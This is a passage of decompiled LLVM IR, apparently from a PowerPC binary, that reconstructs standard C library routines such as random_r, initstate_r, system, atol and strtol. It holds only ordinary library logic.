  %v0_1000ecc8 = load i32, i32* @r3, align 4
  %v2_1000ecc8 = sdiv i32 %v0_1000ecc8, %v1_1000ecc8
  %v2_1000eccc = mul i32 %v2_1000ecc8, %v1_1000ecc8
  %v2_1000ecd0 = sub i32 %v0_1000ecc8, %v2_1000eccc
  %v1_1000ecd4 = mul i32 %v2_1000ecc8, 2836
  store i32 %v1_1000ecd4, i32* %r0.global-to-local, align 4
  %v1_1000ecd8 = mul i32 %v2_1000ecd0, 16807
  %v2_1000ecdc = sub i32 %v1_1000ecd8, %v1_1000ecd4
  store i32 %v2_1000ecdc, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000ecdc, -1
  br i1 %tmp19, label %dec_label_pc_1000ece8, label %dec_label_pc_1000ece4

dec_label_pc_1000ece4:                            ; preds = %dec_label_pc_1000ecc8
  %v1_1000ece4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000ece4 = add i32 %v1_1000ece4, %v2_1000ecdc
  store i32 %v2_1000ece4, i32* @r3, align 4
  br label %dec_label_pc_1000ece8

dec_label_pc_1000ece8:                            ; preds = %dec_label_pc_1000ecc8, %dec_label_pc_1000ece4
  %v0_1000ece8 = phi i32 [ %v2_1000ecdc, %dec_label_pc_1000ecc8 ], [ %v2_1000ece4, %dec_label_pc_1000ece4 ]
  %v2_1000ece8 = add i32 %v1_1000ece8, 4
  %v3_1000ece8 = inttoptr i32 %v2_1000ece8 to i32*
  store i32 %v0_1000ece8, i32* %v3_1000ece8, align 4
  %v0_1000ecec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ecec = add i32 %v0_1000ecec, -1
  store i32 %v1_1000ecec, i32* %ctr.global-to-local, align 4
  %v2_1000ecec = icmp eq i32 %v1_1000ecec, 0
  br i1 %v2_1000ecec, label %dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge, label %dec_label_pc_1000ece8.dec_label_pc_1000ecc8_crit_edge

dec_label_pc_1000ece8.dec_label_pc_1000ecc8_crit_edge: ; preds = %dec_label_pc_1000ece8
  %v1_1000ecc8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000ecc8

dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge: ; preds = %dec_label_pc_1000ece8
  %v0_1000ecf0.pre = load i32, i32* @r30, align 4
  %v0_1000ecf4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000ecf8.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1000ecf0

dec_label_pc_1000ecf0:                            ; preds = %dec_label_pc_1000ecec.preheader.thread, %dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge, %dec_label_pc_1000ecec.preheader
  %v0_1000ecf8 = phi i32 [ %v0_1000ecf8.pre, %dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge ], [ %v0_1000ecb0, %dec_label_pc_1000ecec.preheader ], [ %v0_1000ecb0, %dec_label_pc_1000ecec.preheader.thread ]
  %v0_1000ecf4 = phi i32 [ %v0_1000ecf4.pre, %dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge ], [ %v3_1000ec98, %dec_label_pc_1000ecec.preheader ], [ %v3_1000ec98, %dec_label_pc_1000ecec.preheader.thread ]
  %v1_1000ecf8 = phi i32 [ %v0_1000ecf0.pre, %dec_label_pc_1000ecec.dec_label_pc_1000ecf0_crit_edge ], [ %v0_1000ec98, %dec_label_pc_1000ecec.preheader ], [ %v0_1000ec98, %dec_label_pc_1000ecec.preheader.thread ]
  %v1_1000ecf0 = add i32 %v1_1000ecf8, 20
  %v2_1000ecf0 = inttoptr i32 %v1_1000ecf0 to i32*
  %v3_1000ecf0 = load i32, i32* %v2_1000ecf0, align 4
  store i32 %v3_1000ecf0, i32* %r0.global-to-local, align 4
  %v1_1000ecf4 = mul i32 %v0_1000ecf4, 10
  store i32 %v1_1000ecf4, i32* %r31.global-to-local, align 4
  %v2_1000ecf8 = add i32 %v1_1000ecf8, 4
  %v3_1000ecf8 = inttoptr i32 %v2_1000ecf8 to i32*
  store i32 %v0_1000ecf8, i32* %v3_1000ecf8, align 4
  %v0_1000ecfc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ecfc = mul i32 %v0_1000ecfc, 4
  %v0_1000ed00 = load i32, i32* @r10, align 4
  %v2_1000ed00 = add i32 %v0_1000ed00, %v1_1000ecfc
  store i32 %v2_1000ed00, i32* %r0.global-to-local, align 4
  %v1_1000ed04 = load i32, i32* @r30, align 4
  %v2_1000ed04 = inttoptr i32 %v1_1000ed04 to i32*
  store i32 %v2_1000ed00, i32* %v2_1000ed04, align 4
  %v2_1000ed18 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000ed1021 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ed1022 = add i32 %v0_1000ed1021, -1
  store i32 %v1_1000ed1022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000ed1022, -1
  br i1 %tmp2025, label %dec_label_pc_1000ed0c, label %dec_label_pc_1000ed20

dec_label_pc_1000ed0c:                            ; preds = %dec_label_pc_1000ecf0, %dec_label_pc_1000ed0c
  %v0_1000ed1426 = load i32, i32* @r30, align 4
  %v2_1000ed0c = inttoptr i32 %v0_1000ed1426 to i32*
  %v3_1000ed0c = call i32 @__GI_random_r(i32* %v2_1000ed0c, i32 %v2_1000ed18)
  %v0_1000ed10 = load i32, i32* @r31, align 4
  %v1_1000ed10 = add i32 %v0_1000ed10, -1
  store i32 %v1_1000ed10, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000ed10, -1
  br i1 %tmp20, label %dec_label_pc_1000ed0c, label %dec_label_pc_1000ed20

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ecf0, %dec_label_pc_1000ed0c, %dec_label_pc_1000ec8c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ed24

dec_label_pc_1000ed24:                            ; preds = %entry, %dec_label_pc_1000ed20
  %v0_1000ed24 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000ed20 ]
  store i32 %v0_1000ec58, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ed24

; uselistorder directives
  uselistorder i32 %v1_1000ecec, { 1, 0 }
  uselistorder i32 %v2_1000ece8, { 1, 0 }
  uselistorder i32 %v2_1000ecdc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ecc8, { 1, 0 }
  uselistorder i32 %v0_1000ecb0, { 1, 2, 0 }
  uselistorder i32 %v3_1000ec98, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_1000ed24, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ed0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ecf0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ece8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ecc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec8c, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000ed3c = icmp ugt i32 %arg2, 127
  %v0_1000ed44 = load i32, i32* @lr, align 4
  store i32 %v0_1000ed44, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_1000ed50 = sub i32 255, %arg2
  %v2_1000ed50 = sub i32 -1, %arg2
  %not.v5_1000ed50 = icmp ugt i32 %v1_1000ed50, %v2_1000ed50
  %v6_1000ed54 = sext i1 %not.v5_1000ed50 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000ed5c = add i32 %tmp, 4
  store i32 %v1_1000ed5c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100198ac.444 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000ed74 = sub nsw i32 3, %v6_1000ed54
  store i32 %v1_1000ed74, i32* @r31, align 4
  br i1 %v2_1000ed3c, label %dec_label_pc_1000ed9c, label %dec_label_pc_1000ed7c

dec_label_pc_1000ed7c:                            ; preds = %entry
  %v2_1000ed68 = icmp ugt i32 %arg2, 31
  %v1_1000ed7c = sub i32 63, %arg2
  %not.v5_1000ed7c = icmp ugt i32 %v1_1000ed7c, %v2_1000ed50
  %v6_1000ed80 = sext i1 %not.v5_1000ed7c to i32
  %v1_1000ed88 = sub nsw i32 1, %v6_1000ed80
  store i32 %v1_1000ed88, i32* @r31, align 4
  br i1 %v2_1000ed68, label %dec_label_pc_1000ed9c, label %dec_label_pc_1000ed90

dec_label_pc_1000ed90:                            ; preds = %dec_label_pc_1000ed7c
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000edfc, label %dec_label_pc_1000ed9c

dec_label_pc_1000ed9c:                            ; preds = %dec_label_pc_1000ed90, %dec_label_pc_1000ed7c, %entry
  %v0_1000ed9c = phi i32 [ 0, %dec_label_pc_1000ed90 ], [ %v1_1000ed88, %dec_label_pc_1000ed7c ], [ %v1_1000ed74, %entry ]
  %v1_1000ed9c = mul nsw i32 %v0_1000ed9c, 4
  store i32 %v1_1000ed9c, i32* %r0.global-to-local, align 4
  %v2_1000eda0 = add i32 %arg3, 12
  %v3_1000eda0 = inttoptr i32 %v2_1000eda0 to i32*
  store i32 %v0_1000ed9c, i32* %v3_1000eda0, align 4
  %v0_1000eda4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eda4 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000eda4 = add i32 %v1_1000eda4, %v0_1000eda4
  store i32 %v2_1000eda4, i32* %r9.global-to-local, align 4
  %v3_1000eda8 = inttoptr i32 %v2_1000eda4 to i32*
  %v4_1000eda8 = load i32, i32* %v3_1000eda8, align 4
  store i32 %v4_1000eda8, i32* %r0.global-to-local, align 4
  %v1_1000edac = add i32 %v2_1000eda4, 20
  %v2_1000edac = inttoptr i32 %v1_1000edac to i32*
  %v3_1000edac = load i32, i32* %v2_1000edac, align 4
  store i32 %v3_1000edac, i32* %r9.global-to-local, align 4
  %v1_1000edb0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000edb0 = add i32 %v1_1000edb0, 20
  %v3_1000edb0 = inttoptr i32 %v2_1000edb0 to i32*
  store i32 %v4_1000eda8, i32* %v3_1000edb0, align 4
  %v0_1000edb4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000edb4 = mul i32 %v0_1000edb4, 4
  store i32 %v1_1000edb4, i32* %r0.global-to-local, align 4
  %v0_1000edb8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000edb8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000edb8 = add i32 %v1_1000edb8, 8
  %v3_1000edb8 = inttoptr i32 %v2_1000edb8 to i32*
  store i32 %v0_1000edb8, i32* %v3_1000edb8, align 4
  %v0_1000edbc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000edbc = load i32, i32* %r0.global-to-local, align 4
  %v2_1000edbc = add i32 %v1_1000edbc, %v0_1000edbc
  store i32 %v2_1000edbc, i32* %r0.global-to-local, align 4
  %v0_1000edc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000edc0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000edc0 = add i32 %v1_1000edc0, 16
  %v3_1000edc0 = inttoptr i32 %v2_1000edc0 to i32*
  store i32 %v0_1000edc0, i32* %v3_1000edc0, align 4
  %v0_1000edc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000edc4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000edc4 = add i32 %v1_1000edc4, 24
  %v3_1000edc4 = inttoptr i32 %v2_1000edc4 to i32*
  store i32 %v0_1000edc4, i32* %v3_1000edc4, align 4
  store i32 268496332, i32* @lr, align 4
  %v0_1000edc8 = call i32 @srandom_r()
  %v0_1000edcc = load i32, i32* @r31, align 4
  %v3_1000edcc = icmp eq i32 %v0_1000edcc, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000edd8 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000edd8 = inttoptr i32 %v1_1000edd8 to i32*
  store i32 0, i32* %v2_1000edd8, align 4
  br i1 %v3_1000edcc, label %dec_label_pc_1000ee10, label %dec_label_pc_1000ede0

dec_label_pc_1000ede0:                            ; preds = %dec_label_pc_1000ed9c
  %v0_1000ede0 = load i32, i32* @r30, align 4
  %v1_1000ede0 = add i32 %v0_1000ede0, 4
  %v2_1000ede0 = inttoptr i32 %v1_1000ede0 to i32*
  %v3_1000ede0 = load i32, i32* %v2_1000ede0, align 4
  %v0_1000ede4 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000ede4 = sub i32 %v3_1000ede0, %v0_1000ede4
  %v4_1000ede8 = sdiv i32 %v2_1000ede4, 4
  %v1_1000edec = mul i32 %v4_1000ede8, 5
  %v1_1000edf0 = load i32, i32* @r31, align 4
  %v2_1000edf0 = add i32 %v1_1000edec, %v1_1000edf0
  store i32 %v2_1000edf0, i32* %r0.global-to-local, align 4
  %v1_1000edf4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000edf4 = inttoptr i32 %v1_1000edf4 to i32*
  store i32 %v2_1000edf0, i32* %v2_1000edf4, align 4
  br label %dec_label_pc_1000ee10

dec_label_pc_1000edfc:                            ; preds = %dec_label_pc_1000ed90
  %v0_1000edfc = call i32 @__errno_location()
  store i32 %v0_1000edfc, i32* %r3.global-to-local, align 4
  %v0_1000ee00 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ee00 = inttoptr i32 %v0_1000edfc to i32*
  store i32 %v0_1000ee00, i32* %v2_1000ee00, align 4
  %v0_1000ee04 = call i32 @__errno_location()
  %v0_1000ee08 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ee08 = inttoptr i32 %v0_1000ee04 to i32*
  store i32 %v0_1000ee08, i32* %v2_1000ee08, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ee10

dec_label_pc_1000ee10:                            ; preds = %dec_label_pc_1000ed9c, %dec_label_pc_1000ede0, %dec_label_pc_1000edfc
  store i32 %v0_1000ed44, i32* %r0.global-to-local, align 4
  %v0_1000ee20 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ee20

; uselistorder directives
  uselistorder i32 %v2_1000eda4, { 1, 0, 2 }
  uselistorder i32 %v0_1000ed9c, { 1, 0 }
  uselistorder i32 %v2_1000ed50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100198ac.444 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000ee10, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_1000ee34 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000ee34, label %dec_label_pc_1000ef64, label %dec_label_pc_1000ee44

dec_label_pc_1000ee44:                            ; preds = %entry
  store i32 268496464, i32* @lr, align 4
  %v2_1000ee4c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268496480, i32* @lr, align 4
  %v2_1000ee5c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268496496, i32* @lr, align 4
  %v2_1000ee6c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1000ee6c, i32* @r3, align 4
  store i32 268496504, i32* @lr, align 4
  %v1_1000ee74 = call i32 @__vfork(i32 %v2_1000ee6c)
  store i32 %v1_1000ee74, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_1000ee74, -1
  br i1 %tmp10, label %dec_label_pc_1000eeac, label %dec_label_pc_1000ee80

dec_label_pc_1000ee80:                            ; preds = %dec_label_pc_1000ee44
  store i32 268496524, i32* @lr, align 4
  %v2_1000ee88 = call i32 @__bsd_signal(i32 3, i32 %v2_1000ee4c)
  store i32 268496536, i32* @lr, align 4
  %v2_1000ee94 = call i32 @__bsd_signal(i32 2, i32 %v2_1000ee5c)
  store i32 268496548, i32* @lr, align 4
  %v2_1000eea0 = call i32 @__bsd_signal(i32 17, i32 %v2_1000ee6c)
  br label %dec_label_pc_1000ef64

dec_label_pc_1000eeac:                            ; preds = %dec_label_pc_1000ee44
  %v3_1000ee78 = icmp eq i32 %v1_1000ee74, 0
  br i1 %v3_1000ee78, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000ef04

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000eeac
  store i32 268496572, i32* @lr, align 4
  %v2_1000eeb8 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268496584, i32* @lr, align 4
  %v2_1000eec4 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268496596, i32* @lr, align 4
  %v2_1000eed0 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1000eef8 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10018c6c.381 to i32), i32 ptrtoint ([3 x i8]* @global_var_10018c74.382 to i32), i32 ptrtoint ([3 x i8]* @global_var_10018c78.383 to i32), i32 %arg1, i32 0)
  %v1_1000ef00 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000ef04

dec_label_pc_1000ef04:                            ; preds = %dec_label_pc_1000eeac, %dec_label_pc_1000eeb0
  store i32 268496656, i32* @lr, align 4
  %v2_1000ef0c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268496668, i32* @lr, align 4
  %v2_1000ef18 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1000ef1c = load i32, i32* @r31, align 4
  %v2_1000ef20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268496688, i32* @lr, align 4
  %v4_1000ef2c = call i32 @wait4(i32 %v0_1000ef1c, i32 %v2_1000ef20, i32 0, i32 0)
  %v3_1000ef30 = icmp eq i32 %v4_1000ef2c, -1
  br i1 %v3_1000ef30, label %dec_label_pc_1000ef38, label %dec_label_pc_1000ef3c

dec_label_pc_1000ef38:                            ; preds = %dec_label_pc_1000ef04
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000ef3c

dec_label_pc_1000ef3c:                            ; preds = %dec_label_pc_1000ef04, %dec_label_pc_1000ef38
  store i32 268496712, i32* @lr, align 4
  %v2_1000ef44 = call i32 @__bsd_signal(i32 3, i32 %v2_1000ee4c)
  store i32 268496724, i32* @lr, align 4
  %v2_1000ef50 = call i32 @__bsd_signal(i32 2, i32 %v2_1000ee5c)
  store i32 268496736, i32* @lr, align 4
  %v2_1000ef5c = call i32 @__bsd_signal(i32 17, i32 %v2_1000ee6c)
  %v3_1000ef60 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000ef64

dec_label_pc_1000ef64:                            ; preds = %entry, %dec_label_pc_1000ee80, %dec_label_pc_1000ef3c
  %v0_1000ef74 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1000ee80 ], [ %v3_1000ef60, %dec_label_pc_1000ef3c ]
  ret i32 %v0_1000ef74

; uselistorder directives
  uselistorder i32 %v1_1000ee74, { 1, 0, 2 }
  uselistorder i32 %v2_1000ee6c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ee5c, { 1, 0 }
  uselistorder i32 %v2_1000ee4c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ef64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ef3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef04, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000ef80 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000ef80
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000ef88 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000ef88
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ef9c = load i32, i32* @r4, align 4
  store i32 %v0_1000ef9c, i32* %r25.global-to-local, align 4
  %v0_1000efa4 = load i32, i32* @r5, align 4
  store i32 %v0_1000efa4, i32* %r30.global-to-local, align 4
  %v0_1000efa8 = load i32, i32* @r6, align 4
  store i32 %v0_1000efa8, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000efb0 = load i32, i32* @global_var_1002efac, align 4
  br label %dec_label_pc_1000efbc

dec_label_pc_1000efb8:                            ; preds = %dec_label_pc_1000efbc
  %v1_1000efb8 = add i32 %v0_1000eff0, 1
  store i32 %v1_1000efb8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000efbc

dec_label_pc_1000efbc:                            ; preds = %entry, %dec_label_pc_1000efb8
  %v0_1000eff0 = phi i32 [ %tmp, %entry ], [ %v1_1000efb8, %dec_label_pc_1000efb8 ]
  %v1_1000efbc = inttoptr i32 %v0_1000eff0 to i8*
  %v2_1000efbc = load i8, i8* %v1_1000efbc, align 1
  %v3_1000efbc = zext i8 %v2_1000efbc to i32
  %v1_1000efc0 = mul nuw nsw i32 %v3_1000efbc, 2
  %v2_1000efc4 = add i32 %v1_1000efc0, %v3_1000efb0
  %v3_1000efc4 = inttoptr i32 %v2_1000efc4 to i16*
  %v4_1000efc4 = load i16, i16* %v3_1000efc4, align 2
  %v1_1000efc8 = and i16 %v4_1000efc4, 32
  %v3_1000efc8 = icmp eq i16 %v1_1000efc8, 0
  br i1 %v3_1000efc8, label %dec_label_pc_1000efd0, label %dec_label_pc_1000efb8

dec_label_pc_1000efd0:                            ; preds = %dec_label_pc_1000efbc
  %v3_1000efd0 = icmp eq i8 %v2_1000efbc, 43
  br i1 %v3_1000efd0, label %dec_label_pc_1000eff0, label %dec_label_pc_1000efd8

dec_label_pc_1000efd8:                            ; preds = %dec_label_pc_1000efd0
  %v3_1000efd8 = icmp eq i8 %v2_1000efbc, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_1000efd8, label %dec_label_pc_1000eff0, label %dec_label_pc_1000eff4

dec_label_pc_1000eff0:                            ; preds = %dec_label_pc_1000efd0, %dec_label_pc_1000efd8
  %storemerge = phi i32 [ 1, %dec_label_pc_1000efd8 ], [ 0, %dec_label_pc_1000efd0 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_1000eff0 = add i32 %v0_1000eff0, 1
  store i32 %v1_1000eff0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000eff4

dec_label_pc_1000eff4:                            ; preds = %dec_label_pc_1000efd8, %dec_label_pc_1000eff0
  %v1_1000eff4 = call i32 @__asm_rlwinm.(i32 %v0_1000efa4, i32 0, i32 28, i32 26)
  %v4_1000eff4 = icmp eq i32 %v1_1000eff4, 0
  store i32 %tmp, i32* @r10, align 4
  br i1 %v4_1000eff4, label %dec_label_pc_1000f000, label %dec_label_pc_1000eff4.dec_label_pc_1000f03c_crit_edge

dec_label_pc_1000eff4.dec_label_pc_1000f03c_crit_edge: ; preds = %dec_label_pc_1000eff4
  %v0_1000f03c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000f03c

dec_label_pc_1000f000:                            ; preds = %dec_label_pc_1000eff4
  %v0_1000f000 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f000 = inttoptr i32 %v0_1000f000 to i8*
  %v2_1000f000 = load i8, i8* %v1_1000f000, align 1
  %v0_1000f004 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000f004 = add i32 %v0_1000f004, 10
  store i32 %v1_1000f004, i32* %r30.global-to-local, align 4
  %v3_1000f008 = icmp eq i8 %v2_1000f000, 48
  br i1 %v3_1000f008, label %dec_label_pc_1000f010, label %dec_label_pc_1000f030

dec_label_pc_1000f010:                            ; preds = %dec_label_pc_1000f000
  %v1_1000f010 = add i32 %v0_1000f000, 1
  %v2_1000f010 = inttoptr i32 %v1_1000f010 to i8*
  %v3_1000f010 = load i8, i8* %v2_1000f010, align 1
  %v4_1000f010 = zext i8 %v3_1000f010 to i32
  store i32 %v1_1000f010, i32* %r31.global-to-local, align 4
  %v1_1000f014 = add i32 %v0_1000f004, 8
  store i32 %v1_1000f014, i32* %r30.global-to-local, align 4
  %v1_1000f018 = or i32 %v4_1000f010, 32
  store i32 %v1_1000f010, i32* @r10, align 4
  %v3_1000f020 = icmp eq i32 %v1_1000f018, 120
  br i1 %v3_1000f020, label %dec_label_pc_1000f028, label %dec_label_pc_1000f030

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000f010
  %v1_1000f028 = mul i32 %v1_1000f014, 2
  store i32 %v1_1000f028, i32* %r30.global-to-local, align 4
  %v1_1000f02c = add i32 %v0_1000f000, 2
  store i32 %v1_1000f02c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f030

dec_label_pc_1000f030:                            ; preds = %dec_label_pc_1000f010, %dec_label_pc_1000f000, %dec_label_pc_1000f028
  %v0_1000f0e415 = phi i32 [ %v1_1000f010, %dec_label_pc_1000f028 ], [ %tmp, %dec_label_pc_1000f000 ], [ %v1_1000f010, %dec_label_pc_1000f010 ]
  %v0_1000f030 = phi i32 [ %v1_1000f028, %dec_label_pc_1000f028 ], [ %v1_1000f004, %dec_label_pc_1000f000 ], [ %v1_1000f014, %dec_label_pc_1000f010 ]
  %tmp22 = icmp slt i32 %v0_1000f030, 17
  br i1 %tmp22, label %dec_label_pc_1000f03c, label %dec_label_pc_1000f038

dec_label_pc_1000f038:                            ; preds = %dec_label_pc_1000f030
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000f03c

dec_label_pc_1000f03c:                            ; preds = %dec_label_pc_1000eff4.dec_label_pc_1000f03c_crit_edge, %dec_label_pc_1000f030, %dec_label_pc_1000f038
  %v0_1000f0e414 = phi i32 [ %tmp, %dec_label_pc_1000eff4.dec_label_pc_1000f03c_crit_edge ], [ %v0_1000f0e415, %dec_label_pc_1000f030 ], [ %v0_1000f0e415, %dec_label_pc_1000f038 ]
  %v1_1000f050 = phi i32 [ %v0_1000f03c.pre, %dec_label_pc_1000eff4.dec_label_pc_1000f03c_crit_edge ], [ %v0_1000f030, %dec_label_pc_1000f030 ], [ 16, %dec_label_pc_1000f038 ]
  %v1_1000f03c = add i32 %v1_1000f050, -2
  store i32 0, i32* @r8, align 4
  %v2_1000f044 = icmp ugt i32 %v1_1000f03c, 34
  br i1 %v2_1000f044, label %dec_label_pc_1000f0dc, label %dec_label_pc_1000f04c

dec_label_pc_1000f04c:                            ; preds = %dec_label_pc_1000f03c
  %v2_1000f050 = udiv i32 -1, %v1_1000f050
  store i32 %v2_1000f050, i32* %r29.global-to-local, align 4
  %v2_1000f054 = mul i32 %v2_1000f050, %v1_1000f050
  %v1_1000f058 = sub i32 -1, %v2_1000f054
  %v1_1000f05c = urem i32 %v1_1000f058, 256
  store i32 %v1_1000f05c, i32* %r27.global-to-local, align 4
  %v0_1000f068.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000f064:                            ; preds = %dec_label_pc_1000f0d0, %dec_label_pc_1000f0b8
  %v1_1000f06c.pre = phi i32 [ %v1_1000f070, %dec_label_pc_1000f0d0 ], [ %v1_1000f06c.pre.pre, %dec_label_pc_1000f0b8 ]
  %v0_1000f06c.pre = phi i32 [ %v2_1000f0d4, %dec_label_pc_1000f0d0 ], [ %v0_1000f06c.pre.pre, %dec_label_pc_1000f0b8 ]
  %v0_1000f064 = phi i32 [ %v1_1000f074, %dec_label_pc_1000f0d0 ], [ %v0_1000f064.pre, %dec_label_pc_1000f0b8 ]
  store i32 %v0_1000f064, i32* @r10, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000f068:                            ; preds = %dec_label_pc_1000f04c, %dec_label_pc_1000f064
  %v0_1000f0e412 = phi i32 [ %v0_1000f0e414, %dec_label_pc_1000f04c ], [ %v0_1000f064, %dec_label_pc_1000f064 ]
